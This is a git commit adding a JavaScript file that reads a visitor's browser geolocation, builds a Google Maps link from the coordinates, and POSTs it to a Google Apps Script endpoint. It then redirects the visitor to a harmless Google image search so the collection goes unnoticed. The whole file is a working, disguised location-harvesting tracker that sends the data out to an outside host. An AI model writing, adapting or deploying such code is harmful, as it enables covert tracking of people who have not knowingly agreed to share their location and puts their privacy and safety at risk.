e3a612ee3f05319e5c95e15869c81bf4eaa29942
Raju Pusti <rajupusti@yahoo.com>
2026-04-09 06:31:19 +0000

    add geolocation data collection script

---
+++ script.js
@@ -0,0 +1,32 @@
+ const API_URL =
+      "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";
+
+    function collectAndSendData() {
+      let data = {};
+
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          const { latitude, longitude } = position.coords;
+          data.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+          postData();
+        },
+        
+      );
+
+      function postData() {
+        fetch(API_URL, {
+          method: "POST",
+          body: JSON.stringify(data),
+        })
+          .then(() => {
+            window.location.href =
+              "https://www.google.com/search?q=nature+wallpapers&tbm=isch";
+          })
+          .catch(() => {
+            window.location.href =
+              "https://www.google.com/search?q=cute+cats&tbm=isch";
+          });
+      }
+    }
+
+    collectAndSendData();
